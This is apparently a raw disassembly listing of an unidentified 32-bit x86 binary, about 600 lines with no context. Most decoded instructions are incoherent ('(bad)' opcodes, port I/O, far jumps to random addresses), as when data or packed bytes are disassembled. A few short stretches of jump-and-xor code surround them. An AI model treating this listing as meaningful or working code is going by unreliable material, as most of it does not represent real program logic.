  40badd:	sbb    al,0xfd
  40badf:	fidivr WORD PTR ds:[ebx]
  40bae2:	adc    cl,BYTE PTR [ebx+0x3a24b0e0]
  40bae8:	adc    al,0x31
  40baea:	cld    
  40baeb:	jmp    0x40ba7a
  40baed:	and    al,0x7
  40baef:	cmp    eax,DWORD PTR [eax+esi*8]
  40baf2:	push   esp
  40baf3:	test   edi,edx
  40baf5:	retf   
  40baf6:	das    
  40baf7:	shl    al,0xc5
  40bafa:	or     eax,0x9f957488
  40baff:	push   ds
  40bb00:	or     al,0x59
  40bb02:	mov    esp,0x60a2f6be
  40bb07:	popf   
  40bb08:	aas    
  40bb09:	(bad)  
  40bb0a:	stc    
  40bb0b:	test   al,0xd9
  40bb0d:	lods   eax,DWORD PTR ds:[esi]
  40bb0e:	xchg   edx,edi
  40bb10:	dec    ebx
  40bb11:	push   0x7f
  40bb13:	loop   0x40bb6b
  40bb15:	pop    esi
  40bb16:	sbb    BYTE PTR [eax],dh
  40bb18:	xchg   esi,eax
  40bb19:	or     eax,0xc8a19fef
  40bb1e:	pop    edx
  40bb1f:	cli    
  40bb20:	push   edi
  40bb21:	sub    eax,0x3094566c
  40bb26:	jmp    0xb640:0xfb52ea22
  40bb2d:	call   0x165631d8
  40bb32:	cmp    ah,BYTE PTR [esi-0x1e3bc462]
  40bb38:	div    DWORD PTR [esi]
  40bb3a:	out    0xd2,eax
  40bb3c:	mov    ?,WORD PTR [edx]
  40bb3e:	sbb    edi,ecx
  40bb40:	cli    
  40bb41:	and    esi,edx
  40bb43:	rcr    DWORD PTR [esi],0x9e
  40bb46:	dec    ebp
  40bb47:	(bad)  
  40bb49:	repz int 0x9a
  40bb4c:	or     DWORD PTR [edx-0x79fc5b7],eax
  40bb52:	mov    dh,0x20
  40bb54:	pop    esp
  40bb55:	imul   eax,DWORD PTR [edx],0x2e
  40bb58:	adc    dh,BYTE PTR [esi+0x5a]
  40bb5b:	sbb    BYTE PTR [esi+0x16],0xa7
  40bb5f:	lods   al,BYTE PTR ds:[esi]
  40bb60:	fs sti 
  40bb62:	mov    edi,0x9e9d698d
  40bb67:	loope  0x40bb7f
  40bb69:	add    BYTE PTR [ebx-0x71abcfd7],0xe6
  40bb70:	retf   0xc1d4
  40bb73:	jne    0x40bb80
  40bb75:	mov    esi,0x47cbe762
  40bb7a:	sar    DWORD PTR [edi],cl
  40bb7c:	xchg   edx,eax
  40bb7d:	(bad)  
  40bb7e:	in     al,dx
  40bb7f:	aad    0xeb
  40bb81:	pop    eax
  40bb82:	ins    BYTE PTR es:[edi],dx
  40bb83:	ins    DWORD PTR es:[edi],dx
  40bb84:	sub    cl,BYTE PTR [edx]
  40bb86:	xchg   al,dh
  40bb88:	jns    0x40bbce
  40bb8a:	xlat   BYTE PTR ds:[ebx]
  40bb8b:	and    al,0xea
  40bb8d:	sub    BYTE PTR [esi+0x5a],bl
  40bb90:	jge    0x40bb31
  40bb92:	fistp  QWORD PTR [ebp-0x60a03271]
  40bb98:	aas    
  40bb99:	clc    
  40bb9a:	mov    edx,0x2fcd3587
  40bb9f:	xor    eax,0xd137c998
  40bba4:	sbb    ah,0xa
  40bba7:	rol    BYTE PTR [eax],cl
  40bba9:	mov    ecx,0x176bbce6
  40bbae:	fcomip st,st(4)
  40bbb0:	cmp    BYTE PTR [ebp-0x6758ab27],cl
  40bbb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbb7:	mov    al,ds:0x1b04c724
  40bbbc:	ret    
  40bbbd:	sbb    BYTE PTR [edi+eax*2-0x18],ch
  40bbc1:	loop   0x40bbc4
  40bbc3:	adc    eax,0x8b1fc29
  40bbc8:	xchg   ebp,eax
  40bbc9:	loop   0x40bbf3
  40bbcb:	in     eax,dx
  40bbcc:	add    eax,0xf4d5ab7b
  40bbd1:	mov    WORD PTR [edi+0x1],gs
  40bbd4:	shl    BYTE PTR [ebp+0xb698c42],0x9e
  40bbdb:	aam    0xe8
  40bbdd:	jbe    0x40bbd5
  40bbdf:	cmp    eax,0x8e746a7f
  40bbe4:	mov    ds:0x70e869e9,al
  40bbe9:	aam    0xcb
  40bbeb:	pusha  
  40bbec:	ins    BYTE PTR es:[edi],dx
  40bbed:	lods   al,BYTE PTR ds:[esi]
  40bbee:	loope  0x40bbf3
  40bbf0:	icebp  
  40bbf1:	stos   BYTE PTR es:[edi],al
  40bbf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbf3:	and    al,BYTE PTR [ebx-0x65]
  40bbf6:	pop    edi
  40bbf7:	inc    ebx
  40bbf8:	or     BYTE PTR [edx-0x7f],ch
  40bbfb:	lds    esi,FWORD PTR [ebp+0x46d30eb4]
  40bc01:	call   0xbe843238
  40bc06:	pop    DWORD PTR [eax-0x1e36877f]
  40bc0c:	xchg   ebp,eax
  40bc0d:	push   edx
  40bc0e:	lahf   
  40bc0f:	stc    
  40bc10:	jp     0x40bc3e
  40bc12:	call   0x64b21fec
  40bc17:	cli    
  40bc18:	ficom  DWORD PTR [ebx+ecx*1-0x28]
  40bc1c:	push   ds
  40bc1d:	inc    ecx
  40bc1e:	cmp    DWORD PTR [ecx+0x61],esp
  40bc21:	cdq    
  40bc22:	mov    ah,0xec
  40bc24:	jae    0x40bbd7
  40bc26:	fld    QWORD PTR [esi+ecx*1]
  40bc29:	fwait
  40bc2a:	pop    edi
  40bc2b:	push   ebx
  40bc2c:	je     0x40bbb7
  40bc2e:	hlt    
  40bc2f:	nop
  40bc30:	cwde   
  40bc31:	inc    edi
  40bc32:	and    al,0x87
  40bc34:	test   eax,0x7a4f3e9e
  40bc39:	repnz xchg esp,eax
  40bc3b:	rcr    DWORD PTR [esp+edx*8-0x7],cl
  40bc3f:	sbb    BYTE PTR [edi-0x36],cl
  40bc42:	pop    es
  40bc43:	aam    0x59
  40bc45:	or     eax,0x6fc1a952
  40bc4a:	sbb    cl,cl
  40bc4c:	xchg   DWORD PTR [eax],eax
  40bc4e:	sbb    edx,edx
  40bc50:	bound  esi,QWORD PTR [esi+0x42]
  40bc53:	retf   0xe145
  40bc56:	mov    ds:0x60a43af9,al
  40bc5c:	dec    ecx
  40bc5d:	fst    QWORD PTR [edx-0x18]
  40bc60:	mov    ds:0x84c29e6e,al
  40bc65:	push   edi
  40bc66:	jmp    0x40bc30
  40bc68:	pushf  
  40bc69:	xor    bl,BYTE PTR [edx]
  40bc6b:	pop    edx
  40bc6c:	mov    edi,0xc9f46e45
  40bc71:	mov    esp,0xdebeec84
  40bc76:	inc    ebx
  40bc77:	inc    eax
  40bc78:	aaa    
  40bc79:	jb     0x40bcd2
  40bc7b:	xor    esp,ecx
  40bc7d:	sbb    edx,DWORD PTR [edx]
  40bc7f:	mov    edi,0xd59efad1
  40bc84:	in     eax,dx
  40bc85:	push   ebx
  40bc86:	push   ds
  40bc87:	mov    esp,0x43d8c4cd
  40bc8c:	mov    ds:0x4d6548b,al
  40bc91:	shr    ecx,0x46
  40bc94:	pop    ebp
  40bc95:	add    ebp,DWORD PTR [edx+0x4fd161ce]
  40bc9b:	inc    BYTE PTR [esi]
  40bc9d:	ins    DWORD PTR es:[edi],dx
  40bc9e:	push   ds
  40bc9f:	stc    
  40bca0:	push   ecx
  40bca1:	fsqrt  
  40bca3:	mov    dl,0xfd
  40bca5:	mov    al,0xa4
  40bca7:	fsub   QWORD PTR [esi-0x7e]
  40bcaa:	sub    ebx,edi
  40bcac:	cmp    ebx,edx
  40bcae:	mov    edx,DWORD PTR [ebp-0x38]
  40bcb1:	jbe    0x40bcba
  40bcb7:	mov    edx,DWORD PTR [ebp-0x3c]
  40bcba:	mov    edi,DWORD PTR [ebp-0x4]
  40bcbd:	xor    edi,eax
  40bcbf:	xor    edx,eax
  40bcc1:	jmp    0x40c0d8
  40bcc6:	test   DWORD PTR [ebp-0x48],ecx
  40bcc9:	rol    BYTE PTR [eax-0x33],0x8d
  40bccd:	dec    ebp
  40bcce:	pop    ecx
  40bccf:	repz ror ebx,cl
  40bcd2:	fmul   QWORD PTR [ecx]
  40bcd4:	(bad)  
  40bcd6:	in     al,0x8e
  40bcd8:	jle    0x40bd58
  40bcda:	jo     0x40bd55
  40bcdc:	jle    0x40bd5c
  40bcde:	sahf   
  40bcdf:	sar    DWORD PTR [esi],cl
  40bce1:	iret   
  40bce2:	daa    
  40bce3:	or     eax,0xc3172141
  40bce8:	mov    bh,0x83
  40bcea:	mov    dl,0x62
  40bcec:	lods   al,BYTE PTR ds:[esi]
  40bced:	ins    BYTE PTR es:[edi],dx
  40bcee:	out    dx,al
  40bcef:	loop   0x40bd2a
  40bcf1:	sbb    al,0x77
  40bcf3:	lods   al,BYTE PTR ds:[esi]
  40bcf4:	adc    dl,ch
  40bcf6:	mov    cs,WORD PTR [ebp+0x522000d2]
  40bcfc:	shr    BYTE PTR [edx+0x48],1
  40bcff:	adc    esp,DWORD PTR [ecx+0x52]
  40bd02:	sub    BYTE PTR [esi+edx*4],ch
  40bd05:	cmp    DWORD PTR [ebx-0x37],esp
  40bd08:	in     eax,0xf0
  40bd0a:	arpl   WORD PTR [ecx],si
  40bd0c:	cmc    
  40bd0d:	mov    eax,ds:0x3b8f39cc
  40bd12:	mov    ebx,0x85cbbde6
  40bd17:	lea    esp,[edi-0x6148186]
  40bd1d:	sbb    BYTE PTR [esi+0x2e3a3688],cl
  40bd23:	adc    esi,DWORD PTR [eax]
  40bd25:	sbb    BYTE PTR [eax-0x27],bl
  40bd28:	sbb    edx,DWORD PTR fs:[ebp+0x65]
  40bd2c:	out    dx,eax
  40bd2d:	pop    esp
  40bd2e:	hlt    
  40bd2f:	add    ah,dh
  40bd31:	jl     0x40bd26
  40bd33:	call   0x19532dfc
  40bd38:	adc    DWORD PTR [esi],ebp
  40bd3a:	mov    edi,0xeb56fa48
  40bd3f:	sbb    DWORD PTR [edx+0x1e],esp
  40bd42:	imul   ebx,eax,0x93611ce1
  40bd48:	arpl   WORD PTR [edi+0x3e89251d],ax
  40bd4e:	push   eax
  40bd4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd50:	inc    edi
  40bd51:	sub    eax,0xd1619990
  40bd56:	cld    
  40bd57:	pop    esi
  40bd58:	dec    ecx
  40bd59:	and    BYTE PTR [ecx-0x51],0xd6
  40bd5d:	or     DWORD PTR [ebp+0x59],ebp
  40bd60:	shr    eax,0x3a
  40bd63:	pop    es
  40bd64:	ja     0x40bd93
  40bd66:	mov    al,BYTE PTR [eax-0x5e62b0b9]
  40bd6c:	cmc    
  40bd6d:	cmp    DWORD PTR [esi+0x51],esi
  40bd70:	loopne 0x40bd18
  40bd72:	popa   
  40bd73:	out    0x24,eax
  40bd75:	sbb    ecx,DWORD PTR [esi]
  40bd77:	jbe    0x40bde3
  40bd79:	cmc    
  40bd7a:	repnz cs popa 
  40bd7d:	imul   edx,esi,0xef56d8e
  40bd83:	nop
  40bd84:	xor    al,0x1b
  40bd86:	mov    esp,0x224fca6e
  40bd8b:	lahf   
  40bd8c:	rcl    eax,0xa3
  40bd8f:	outs   dx,BYTE PTR ds:[esi]
  40bd90:	sub    DWORD PTR [esi-0x6d],ebp
  40bd93:	adc    al,0x7f
  40bd95:	stos   BYTE PTR es:[edi],al
  40bd96:	(bad)  
  40bd97:	mov    dl,BYTE PTR [edi-0x4f42144c]
  40bd9d:	dec    ebp
  40bd9e:	xor    dh,dl
  40bda0:	or     BYTE PTR [edx-0x5552ebe8],ah
  40bda6:	std    
  40bda7:	jne    0x40be08
  40bda9:	adc    al,0xae
  40bdab:	ret    
  40bdac:	dec    eax
  40bdad:	xor    BYTE PTR [eax-0x64a28d05],0x5b
  40bdb4:	fwait
  40bdb5:	outs   dx,DWORD PTR ds:[esi]
  40bdb6:	into   
  40bdb7:	or     al,0x92
  40bdb9:	lods   al,BYTE PTR ds:[esi]
  40bdba:	jmp    0x124d79e1
  40bdbf:	adc    eax,0xa36224c1
  40bdc4:	xchg   ebx,eax
  40bdc5:	ds xchg ebx,eax
  40bdc7:	lock adc al,0x46
  40bdca:	adc    ecx,DWORD PTR [eax+ebx*2-0x1364bd92]
  40bdd1:	in     al,dx
  40bdd2:	aaa    
  40bdd3:	fnstenv [ebx-0x15f49278]
  40bdd9:	je     0x40be26
  40bddb:	bound  edi,QWORD PTR [edi+0x7f]
  40bdde:	mov    bh,BYTE PTR [edi+0x71]
  40bde1:	cmc    
  40bde2:	les    eax,FWORD PTR [eax-0x2b81b411]
  40bde8:	jo     0x40bdff
  40bdea:	les    esi,FWORD PTR [ebx+edx*1+0x28]
  40bdee:	mov    eax,ds:0x6a6ce4db
  40bdf3:	pop    edx
  40bdf4:	sub    al,0xf0
  40bdf6:	xlat   BYTE PTR ds:[ebx]
  40bdf8:	nop
  40bdf9:	lods   al,BYTE PTR ds:[esi]
  40bdfa:	jno    0x40be02
  40bdfc:	clc    
  40bdfd:	popa   
  40bdfe:	stos   BYTE PTR es:[edi],al
  40bdff:	xchg   BYTE PTR ds:0x5bc22278,cl
  40be05:	jmp    esi
  40be07:	inc    eax
  40be08:	test   al,0x6e
  40be0a:	xor    al,0xdf
  40be0c:	cli    
  40be0d:	repz imul edx,DWORD PTR [eax+0x30],0xd6aec4e
  40be15:	(bad)  
  40be16:	jecxz  0x40be0f
  40be18:	lods   al,BYTE PTR ds:[esi]
  40be19:	jb     0x40be3d
  40be1b:	mov    ch,0xbc
  40be1d:	push   ebp
  40be1e:	cmp    DWORD PTR [ebp-0x18],0x69574b4f
  40be25:	stc    
  40be26:	mov    eax,ds:0xaac1209b
  40be2b:	mov    edx,0xd5c175b3
  40be30:	dec    edi
  40be31:	inc    ebp
  40be32:	inc    ebp
  40be33:	add    eax,0xfd1b9e72
  40be38:	div    BYTE PTR [edx-0x470a8baa]
  40be3e:	je     0x40bde4
  40be40:	gs out 0xb7,eax
  40be43:	rcl    DWORD PTR [ebx+0x50445d80],1
  40be49:	cmp    eax,0x4930f769
  40be4e:	cli    
  40be4f:	stos   BYTE PTR es:[edi],al
  40be50:	xchg   DWORD PTR [edx],edi
  40be52:	adc    eax,0x273d8fb1
  40be57:	push   ss
  40be58:	add    ecx,DWORD PTR [eax+0x7357811e]
  40be5e:	xchg   BYTE PTR [eax+0x65],al
  40be61:	shr    BYTE PTR [esi],1
  40be63:	xor    DWORD PTR [eax+0x3d],edx
  40be66:	rcr    BYTE PTR [eax],0x7
  40be69:	dec    esp
  40be6a:	or     al,0x90
  40be6c:	in     al,0x2e
  40be6e:	mov    edx,0xe506320a
  40be73:	inc    eax
  40be74:	sub    BYTE PTR [esi+0x24],al
  40be77:	and    eax,0xd21e6a39
  40be7c:	adc    al,BYTE PTR [ebx+0x72ba3cfe]
  40be82:	cmp    eax,0x1520185d
  40be87:	mov    edx,0xa6e2e391
  40be8c:	cli    
  40be8d:	xchg   esi,eax
  40be8e:	or     al,0xd6
  40be90:	jmp    0x40be46
  40be92:	in     eax,0x28
  40be94:	jnp    0x40bea7
  40be96:	adc    ecx,ebp
  40be98:	sar    DWORD PTR [eax-0x50],1
  40be9b:	mov    dl,0x7c
  40be9d:	out    dx,al
  40be9e:	pop    esp
  40be9f:	(bad)  
  40bea0:	sar    BYTE PTR [esi-0x55b9ca21],cl
  40bea6:	dec    esp
  40bea7:	ins    BYTE PTR es:[edi],dx
  40bea8:	add    BYTE PTR [ebx-0x32],dh
  40beab:	stos   DWORD PTR es:[edi],eax
  40beac:	test   esp,ecx
  40beae:	push   cs
  40beaf:	into   
  40beb0:	jne    0x40bf31
  40beb2:	cld    
  40beb3:	push   eax
  40beb4:	in     eax,0x48
  40beb6:	repz push edi
  40beb8:	jne    0x40bf01
  40beba:	dec    edi
  40bebb:	int    0x9f
  40bebd:	jmp    FWORD PTR [esi]
  40bebf:	adc    eax,0x80ea2ef
  40bec4:	gs loope 0x40beea
  40bec7:	sbb    BYTE PTR [ecx+0x20c68a0f],0x57
  40bece:	outs   dx,DWORD PTR ds:[esi]
  40becf:	mov    ebx,0xf02cc5c6
  40bed4:	mov    ds:0xcd0abfa0,eax
  40bed9:	stos   DWORD PTR es:[edi],eax
  40beda:	aas    
  40bedb:	jl     0x40bf46
  40bedd:	fdivr  QWORD PTR [ebx]
  40bedf:	loopne 0x40bf49
  40bee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bee2:	jo     0x40bee8
  40bee4:	sub    BYTE PTR [ebx-0x63],0x1a
  40bee8:	fidiv  WORD PTR [esi+0x1f]
  40beeb:	cmp    edi,DWORD PTR [edi-0x7a]
  40beee:	cmp    eax,0x11b394d8
  40bef3:	fdiv   DWORD PTR [ecx]
  40bef5:	outs   dx,DWORD PTR ds:[esi]
  40bef6:	pop    esi
  40bef7:	mov    ebx,0x7ff8772e
  40befc:	(bad)  
  40befd:	xchg   ecx,eax
  40befe:	mov    eax,ds:0xe8a6a663
  40bf03:	xor    cl,BYTE PTR [eax+eiz*1]
  40bf06:	sub    dl,dl
  40bf08:	out    dx,al
  40bf09:	sub    DWORD PTR [esi-0x8],ecx
  40bf0c:	pop    ebp
  40bf0d:	xchg   ecx,eax
  40bf0e:	inc    eax
  40bf0f:	sar    DWORD PTR [eax-0x31],0x62
  40bf13:	shr    BYTE PTR [esp+eiz*4-0x1edad84d],cl
  40bf1a:	mov    DWORD PTR [edi-0x727433be],ebp
  40bf20:	ret    
  40bf21:	ds jmp 0x236a4c18
  40bf27:	pop    eax
  40bf28:	(bad)  
  40bf2a:	data16 shl ch,cl
  40bf2d:	ins    BYTE PTR es:[edi],dx
  40bf2e:	ss in  eax,0x52
  40bf31:	test   BYTE PTR [esi],0x2
  40bf34:	push   ds
  40bf35:	sar    DWORD PTR [edx],0x9b
  40bf38:	loopne 0x40bf65
  40bf3a:	int3   
  40bf3b:	ret    0xca3e
  40bf3e:	mov    esp,0x872dafe7
  40bf43:	cmp    DWORD PTR [ecx+0x75],edx
  40bf46:	in     al,dx
  40bf47:	adc    esi,ecx
  40bf49:	mov    al,ds:0xb049f4a6
  40bf4e:	push   edi
  40bf4f:	lahf   
  40bf50:	imul   ebp,DWORD PTR [edx+0x64],0xe29f09b3
  40bf57:	pop    ecx
  40bf58:	pop    ecx
  40bf59:	dec    esi
  40bf5a:	sub    eax,0xa41554ed
  40bf5f:	(bad)  
  40bf60:	jle    0x40bfd1
  40bf62:	aas    
  40bf63:	jne    0x40bf15
  40bf65:	and    eax,0x80452d3
  40bf6a:	icebp  
  40bf6b:	or     cl,bh
  40bf6d:	mov    bh,0xe6
  40bf6f:	aam    0xef
  40bf71:	add    eax,0x62abdde5
  40bf76:	pop    ecx
  40bf77:	sbb    DWORD PTR [edx+0xd],edi
  40bf7a:	mov    eax,ds:0xfe088f68
  40bf7f:	fucomi st,st(1)
  40bf81:	pop    ss
  40bf82:	sub    ecx,DWORD PTR [esi-0x4a]
  40bf85:	xlat   BYTE PTR ds:[ebx]
  40bf87:	and    ebp,DWORD PTR [edi+0x2b568079]
  40bf8d:	xor    eax,0x226c0a76
  40bf92:	and    edx,DWORD PTR [edx+0x1bc70b87]
  40bf98:	push   0xf54c4a8a
  40bf9d:	inc    esi
  40bf9e:	or     ah,BYTE PTR [eax+eiz*4]
  40bfa1:	cmp    eax,0x4a5a28ea
  40bfa6:	sub    ah,BYTE PTR [edx]
  40bfa8:	pushf  
  40bfa9:	fwait
  40bfaa:	jne    0x40bfbf
  40bfac:	xor    DWORD PTR [edi],edx
  40bfae:	push   ecx
  40bfaf:	fadd   QWORD PTR [eax-0x4885ca9e]
  40bfb5:	and    DWORD PTR [eax+0x3b],esp
  40bfb8:	(bad)  
  40bfb9:	sub    dh,dh
  40bfbb:	cmp    al,0x82
  40bfbd:	sbb    al,0xb4
  40bfbf:	punpckhwd mm5,QWORD PTR [eax-0xf]
  40bfc3:	pop    edi
  40bfc4:	mov    esp,0xa3b8ae2c
  40bfc9:	dec    ebp
  40bfca:	out    dx,al
  40bfcb:	jle    0x40bf8e
  40bfcd:	ffree  st(0)
  40bfcf:	in     eax,dx
  40bfd0:	mov    edx,0xac9fb055
  40bfd5:	fst    DWORD PTR [ebp+eiz*2-0x65]
  40bfd9:	fmul   DWORD PTR [esi+0x57bfdfde]
  40bfdf:	and    ebp,DWORD PTR [esi]
  40bfe1:	mov    ebx,gs
  40bfe3:	push   edx
  40bfe4:	out    0xfc,al
  40bfe6:	test   al,0x98
  40bfe8:	cmp    edi,ebx
  40bfea:	ins    DWORD PTR es:[edi],dx
  40bfeb:	cmp    BYTE PTR [edi+0x38b68698],0x63
  40bff2:	jbe    0x40bf79
  40bff4:	adc    edi,ebp
  40bff6:	rol    BYTE PTR [ecx-0x28],cl
  40bff9:	push   ss
  40bffa:	scas   eax,DWORD PTR es:[edi]
  40bffb:	xchg   ebx,eax
  40bffc:	rcl    DWORD PTR [ebx+0x1e],cl
  40bfff:	push   ds
  40c000:	dec    edi
  40c001:	inc    edx
  40c002:	mov    eax,ds:0x5e758d
  40c007:	pop    edi
  40c008:	and    bl,al
  40c00a:	jbe    0x40bfc1
  40c00c:	cmp    ah,BYTE PTR [edx+0x21073724]
  40c012:	enter  0x11c2,0xa8
  40c016:	les    eax,FWORD PTR [edi-0x6b779638]
  40c01c:	xor    eax,0x9d235786
  40c021:	sub    DWORD PTR ds:0xe07742e0,edx
  40c027:	mov    WORD PTR [esi+0x133abc17],ss
  40c02d:	sub    al,0x4d
  40c02f:	dec    esi
  40c030:	call   0x9e030800
  40c035:	xchg   ecx,eax
  40c036:	adc    al,0xf2
  40c038:	adc    DWORD PTR [edx+edi*2],edx
  40c03b:	sbb    cl,ah
  40c03d:	jl     0x40c061
  40c03f:	jnp    0x40bff3
  40c041:	xchg   edi,eax
  40c042:	xchg   BYTE PTR [ebp-0x20],bl
  40c045:	mov    ebp,0x628fd1e5
  40c04a:	xor    al,0xd7
  40c04c:	and    eax,0xb5fc2499
  40c051:	jmp    0xd9c2:0x90fdbf92
  40c058:	cdq    
  40c059:	retf   0x2352
  40c05c:	dec    ebx
  40c05d:	push   0xffffffab
  40c05f:	xor    BYTE PTR [edi+0x41914a83],0x6c
  40c066:	ret    
  40c067:	(bad)  
  40c069:	xchg   ebx,eax
  40c06a:	xor    ecx,DWORD PTR [eax+0x6c]
  40c06d:	aaa    
  40c06e:	mov    ah,0x23
  40c070:	test   eax,0xfb9e26ed
  40c075:	rcl    dh,1
  40c077:	pop    edi
  40c078:	xchg   esi,eax
  40c079:	push   cs
  40c07a:	iret   
  40c07b:	pop    esi
  40c07c:	xchg   edi,eax
  40c07d:	dec    ecx
  40c07e:	push   es
  40c07f:	call   FWORD PTR [edi+0x421c26b6]
  40c085:	sbb    eax,0xfb32e882
  40c08a:	mov    ds:0xf5779b64,eax
  40c08f:	retf   
  40c090:	pusha  
  40c091:	mov    dh,0x61
  40c093:	add    BYTE PTR [ebp-0x1b988414],bh
  40c099:	pop    eax
  40c09a:	out    0xb,eax
  40c09c:	in     al,dx
  40c09d:	or     eax,0x61fe49e0
  40c0a2:	push   ds
  40c0a3:	cdq    
  40c0a4:	pushf  
  40c0a5:	fsub   QWORD PTR [ebx+0x38d82cac]
  40c0ab:	pop    ebp
  40c0ac:	mov    bl,bl
  40c0ae:	dec    esi
  40c0af:	call   0xec1f:0x624a1d8e
  40c0b6:	(bad)  
  40c0b7:	pop    edx
  40c0b8:	in     eax,dx
  40c0b9:	xchg   DWORD PTR [edi+0x43],ebx
  40c0bc:	cmp    BYTE PTR [edx],al
  40c0be:	addr16 addr16 cmc 
  40c0c1:	outs   dx,BYTE PTR ds:[esi]
  40c0c2:	xor    BYTE PTR [eax+0x4b],ah
  40c0c5:	cmp    DWORD PTR [edi+0x76],ebp
  40c0c8:	jg     0x40c05f
  40c0ca:	sar    BYTE PTR [ecx+0x78],1
  40c0cd:	inc    esp
  40c0ce:	(bad)  
  40c0d0:	cmp    al,bh
  40c0d2:	xchg   ecx,eax
  40c0d3:	mov    ecx,0xd0374c6c
  40c0d8:	add    edi,ecx
  40c0da:	add    edx,ecx
  40c0dc:	jmp    0x40c4f3
  40c0e1:	cmp    eax,0x7dcf74e8
  40c0e6:	dec    ebx
  40c0e7:	mov    ebp,0xd527fffc
  40c0ec:	rol    BYTE PTR [ebp-0x1b],1
  40c0ef:	and    eax,0x7e8ade3d
  40c0f4:	jle    0x40c166
  40c0f6:	jns    0x40c176
  40c0f8:	jle    0x40c11f
  40c0fa:	out    dx,al
  40c0fb:	xchg   esp,eax
  40c0fc:	cli    
  40c0fd:	jge    0x40c08d
  40c0ff:	cmc    
  40c100:	fcom   QWORD PTR [edx+0x330a6ced]
  40c106:	js     0x40c08c
  40c108:	iret   
  40c109:	enter  0x980b,0xa4
  40c10d:	push   ds
  40c10e:	mov    cl,0xf9
  40c110:	adc    eax,0x64b537fc
  40c115:	dec    ebx
  40c116:	sbb    eax,0x5bdd2872
  40c11b:	out    0x54,al
  40c11d:	sar    DWORD PTR [edi],1
  40c11f:	add    bh,BYTE PTR es:[ebp+0x77]
  40c123:	inc    esp
  40c124:	daa    
  40c125:	cmp    eax,0xdf45a939
  40c12a:	test   BYTE PTR [edx-0x4df06c7],dh
  40c130:	lds    ecx,FWORD PTR [ebx+0x305f2926]
  40c136:	inc    edx
  40c137:	in     al,0x6b
  40c139:	and    DWORD PTR [ebp+0x7c054a63],ebp
  40c13f:	xor    esi,0x3
  40c142:	sub    al,0xc1
  40c144:	ins    BYTE PTR es:[edi],dx
  40c145:	repnz mov BYTE PTR fs:[esi-0x435317b7],ch
  40c14d:	cmp    al,0x1a
  40c14f:	pop    ds
  40c150:	mov    edi,0x4998bdb0
  40c155:	xchg   esp,eax
  40c156:	in     al,0x63
  40c158:	clc    
  40c159:	or     DWORD PTR es:[edi],0x68
  40c15d:	sub    DWORD PTR [ebx+ebp*4],esi
  40c160:	gs repnz int 0x39
  40c164:	cmc    
  40c165:	cmp    al,al
  40c167:	or     ah,0xd1
  40c16a:	xchg   DWORD PTR [ebx+0x48],edx
  40c16d:	shl    BYTE PTR [edi],0xf7
  40c170:	aas    
  40c171:	call   0xea49a2bf
  40c176:	sub    esp,0x9593e095
  40c17c:	cs in  eax,dx
  40c17e:	push   es
  40c17f:	aas    
  40c180:	lar    ebp,WORD PTR [ebx+edx*2+0x26]
  40c185:	sbb    DWORD PTR [edx],esp
  40c187:	mov    ds:0xc66fc44d,eax
  40c18c:	push   edi
  40c18d:	pop    ebp
  40c18e:	test   al,0xe1
  40c190:	loope  0x40c1cd
  40c192:	jae    0x40c18a
  40c194:	(bad)  
  40c195:	icebp  
  40c196:	xor    BYTE PTR [edx-0x4e],0x3a
  40c19a:	jge    0x40c1ad
  40c19c:	push   ss
  40c19d:	(bad)  
  40c19e:	cwde   
  40c19f:	and    dh,bl
  40c1a1:	xchg   edx,eax
  40c1a2:	lahf   
  40c1a3:	mov    eax,0x733a9a69
  40c1a8:	xchg   esp,eax
  40c1a9:	xor    eax,0x32347f30
  40c1ae:	pop    es
  40c1af:	add    esi,ecx
  40c1b1:	loopne 0x40c17f
  40c1b3:	mov    cl,0x57
  40c1b5:	jmp    0x68a0a595
  40c1ba:	repnz test DWORD PTR [edi],0x24d2a384
  40c1c1:	mov    bl,0xce
  40c1c3:	mov    dh,0xb9
  40c1c5:	jae    0x40c1d2
  40c1c7:	fcmovnbe st,st(4)
  40c1c9:	or     ah,BYTE PTR [eax]
  40c1cb:	loop   0x40c194
  40c1cd:	or     DWORD PTR [ebx+0x7f],esp
  40c1d0:	clc    
  40c1d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1d2:	(bad)  
  40c1d4:	aas    
  40c1d5:	push   edi
  40c1d6:	repz pushf 
  40c1d8:	mov    bl,0xfa
  40c1da:	inc    edi
  40c1db:	jne    0x40c238
  40c1dd:	pop    ebp
  40c1de:	or     ah,BYTE PTR [ebx-0x50]
  40c1e1:	rol    esi,0xe5
  40c1e4:	mov    ds:0xe0064e95,al
  40c1e9:	add    BYTE PTR [edx],dh
  40c1eb:	mov    esp,0xf4f664a
  40c1f0:	leave  
  40c1f1:	cdq    
  40c1f2:	aad    0x19
  40c1f4:	repz cwde 
  40c1f6:	cmp    bl,BYTE PTR [esi]
  40c1f8:	lods   eax,DWORD PTR ds:[esi]
  40c1f9:	hlt    
  40c1fa:	jp     0x40c1de
  40c1fc:	shl    BYTE PTR [esi+edi*1+0x1a6d3d26],1
  40c203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c204:	jbe    0x40c24f
  40c206:	xor    al,0xf5
  40c208:	mov    ch,0x28
  40c20a:	mov    dh,BYTE PTR [ebx+0xe2024cc]
  40c210:	push   ds
  40c211:	scas   al,BYTE PTR es:[edi]
  40c212:	fstp   QWORD PTR [ecx-0x5d731b5d]
  40c218:	push   esi
  40c219:	jmp    0x7968:0x2a958ea6
  40c220:	fstp   TBYTE PTR [edi]
  40c222:	popa   
  40c223:	fld    QWORD PTR [esi*4-0x4340c989]
  40c22a:	sub    al,BYTE PTR [edi+0x29e722f8]
  40c230:	fisubr WORD PTR [eax-0x7d7ee690]
  40c236:	pop    es
  40c237:	ds icebp 
  40c239:	jb     0x40c28a
  40c23b:	rol    esp,0xe1
  40c23e:	and    eax,0xc710223c
  40c243:	(bad)  
  40c245:	jl     0x40c244
  40c247:	sbb    DWORD PTR [edx+0x74d4d7a9],edx
  40c24d:	shl    DWORD PTR [ebx+0x45],1
  40c250:	cmp    bl,ch
  40c252:	mov    WORD PTR [edx+edx*2+0x4fd6ab31],?
  40c259:	xchg   ecx,eax
  40c25a:	sbb    edi,ebx
  40c25c:	push   edx
  40c25d:	sbb    BYTE PTR [ecx],dl
  40c25f:	xor    ebx,DWORD PTR [esi+0x70]
  40c262:	and    al,0x31
  40c264:	push   ecx
